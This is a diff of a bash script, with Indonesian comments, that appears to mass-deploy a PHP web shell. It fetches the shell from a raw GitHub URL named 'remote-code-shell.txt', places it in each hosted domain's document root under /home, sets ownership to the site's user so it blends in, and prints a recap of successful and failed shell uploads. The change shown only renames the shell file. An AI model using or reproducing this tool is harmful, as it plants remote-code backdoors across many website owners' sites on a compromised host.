@@ -2,7 +2,7 @@
 
 TESTFILE="test123zz.txt"
 SHELL_URL="https://raw.githubusercontent.com/freyarion25/Kyy-Shell/refs/heads/main/remote-code-shell.txt"
-SHELL_NAME="sah-man.php"
+SHELL_NAME="lokyy.php"
 echo "TESTPAGE_$(date +%s)" > "/tmp/$TESTFILE"
 
 # ---------- helper: extract domain dari config ----------
@@ -194,8 +194,8 @@ for domain in "${domains_list[@]}"; do
 
         if [ -s "$shell_path" ]; then
             # --- chown sesuai logic ---
-            # /home/{user}/{root_doc}/sah-man.php            -> user:user
-            # /home/{user}/{root_doc}/{subdomain.com}/sah-man.php -> user:user
+            # /home/{user}/{root_doc}/lokyy.php            -> user:user
+            # /home/{user}/{root_doc}/{subdomain.com}/lokyy.php -> user:user
             if [ -n "$user" ] && id "$user" &>/dev/null; then
                 chown "${user}:${user}" "$shell_path" 2>/dev/null
                 chown_rc=$?
@@ -234,7 +234,7 @@ echo "  ✗ Failed     : ${#FAIL_TEST[@]}"
 for d in "${FAIL_TEST[@]}"; do echo "      - $d"; done
 
 echo "----------------------------------------"
-echo "REKAP UPLOAD SHELL (sah-man.php)"
+echo "REKAP UPLOAD SHELL (lokyy.php)"
 echo "  ✓ Success    : ${#OK_SHELL[@]}"
 for d in "${OK_SHELL[@]}"; do echo "      - $d"; done
 echo "  ✗ Failed     : ${#FAIL_SHELL[@]}"
